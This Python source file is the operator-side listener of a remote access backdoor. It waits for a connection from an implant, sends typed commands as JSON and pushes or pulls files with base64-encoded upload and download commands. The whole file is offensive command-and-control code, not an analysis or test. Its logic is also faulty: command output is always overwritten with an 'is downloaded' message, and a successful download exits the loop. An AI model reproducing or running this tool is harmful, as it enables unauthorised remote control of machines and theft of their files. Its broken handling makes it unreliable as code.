import socket
import simplejson as json
import base64


class Listener:

    def __init__(self, ip, port):
        self.link = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.link.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.link.bind((ip, port))
        self.link.listen(0)
        print('Listening on port {}'.format(port))
        (self.link_1, address) = self.link.accept()

    def packaging(self, data):
        packet = json.dumps(data)
        self.link_1.sendall(packet.encode("utf-8"))

        if data[0] == "exit":
            self.link_1.close()
            exit()

    def packet_decode(self):
        incoming_data = ""
        while True:
            try:
                incoming_data = incoming_data + self.link_1.recv(1024).decode("utf-8")
                return json.loads(incoming_data)
            except ValueError:
                continue

    def start(self):
        while True:
            entrance = input("Write a command: ")
            entrance = entrance.split(" ")
            try:
                if entrance[0] == "upload":
                    with open(entrance[1], "rb") as file:
                        data = base64.b64encode(file.read())
                        entrance.append(data)

                self.packaging(entrance)
                output = self.packet_decode()

                if entrance[0] == "download" and "Incorrect command" not in output:
                    with open(entrance[1], "wb") as file:
                        return file.write(base64.b64decode(output))

                output = entrance[1] + " is downloaded"
            except Exception as e:
                output = "Incorrect command"
            print(output)


listener = Listener(ip="127.0.0.1", port=8080)
listener.start()
